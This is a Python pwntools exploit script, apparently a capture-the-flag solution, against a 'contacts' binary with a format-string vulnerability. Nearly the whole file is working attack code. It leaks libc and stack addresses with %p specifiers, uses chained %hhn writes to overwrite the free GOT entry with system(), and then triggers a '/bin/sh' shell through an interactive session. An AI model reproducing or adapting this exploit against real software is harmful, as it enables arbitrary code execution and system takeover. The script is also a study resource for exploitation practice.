#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

from struct import pack, unpack
from functools import partial
with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	conn.sendline(line)

	with open('payload', 'a') as f:
		line += '\x0a' # fuck you :)
		f.write(line)

conn = process("./contacts_54f3188f64e548565bc1b87d7aa07427")

current_val = 0

def set_cur_val(a):
	global current_val
	gets_to_zero = 256 - current_val # add this to get to 0x00
	gets_to_destination = gets_to_zero + a # add this to get to where you want to be
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256
	current_val = a
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%1$0" + str(inc) + "c" 

def decompose_data(data):
	hexStr = hex(data)[2:][::-1] # little endian
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]
	bytes = [int(x,16) for x in byteList]
	return bytes

def off_write(offset, byte):
	"""
		Use this stack addres offset, to write a byte
	"""
	global current_val
	payload = set_cur_val(byte)
	payload += "%{0}$hhn".format(offset)
	return payload

def write_and_prep_next(offsets, byte, next_lsb):
	"""
		|can't change|  |change LSB|  |full control|
		|____________|__|__________|__|____________|
		|   offset1  |->|  offset2 |->|  offset3   |
		____________________________________________

		use offset1 to change the LSB of offset2
		use offset2 to change all the bytes of offset3
		use offset3 to write wherever
	"""
	global current_val
	current_val = 0
	# write the current value
	payload = off_write(offsets[1], byte)
	# prepare our wiggle ninja pointer for the next format string
	payload +=off_write(offsets[0], next_lsb)

	return payload

def payload_chain(offsets, address, data):
	lsbAddr3 = decompose_data(address)[0]
	bytes = decompose_data(data)
	payload = partial(write_and_prep_next, offsets=offsets)
	next_lsbs = [lsbAddr3 + x for x in [1,2,3,0]]
	arr = [payload(byte=b, next_lsb=l) for b,l in zip(bytes,next_lsbs)]
	return arr


def createContact(name, description):
	send(conn, "1")
	send(conn, name) # name
	send(conn, "1337") # number
	send(conn, str(len(description))) # len of description
	send(conn, description)


def remove_contact(name):
	send(conn, "2")
	send(name)

createContact("Leak", "Libc:%2$p:::Stack:%18$p;;;")

send(conn, "4")
response = conn.recvuntil(';;;')

libc_leak = int(response[response.index('Libc:')+5 : response.index(':::')],16)
stack_leak= int(response[response.index('Stack:')+6: response.index(';;;')],16)

system = libc_leak - 20083 -60248
free_plt = 0x0804b014

def setup_chain(offsets, address, data):
	for load in payload_chain(data=data, offsets=offsets, address=address):
		createContact("Hack", load) 

offset3_addr = stack_leak
# 6 fiddles 18 to write free_plt into 30
setup_chain([6,18],  address=offset3_addr, data=free_plt) # create the contacts
# 18 fiddles 30 to write system into free_plt
setup_chain([18,30], address=free_plt, data=system) # create the contacts

createContact("/bin/sh", "/bin/sh")
send(conn, "4") # execute format string
send(conn, "2") # edit 
send(conn, "/bin/sh") # edit AAAA
conn.recvuntil(">>> Name to remove?")
conn.interactive()




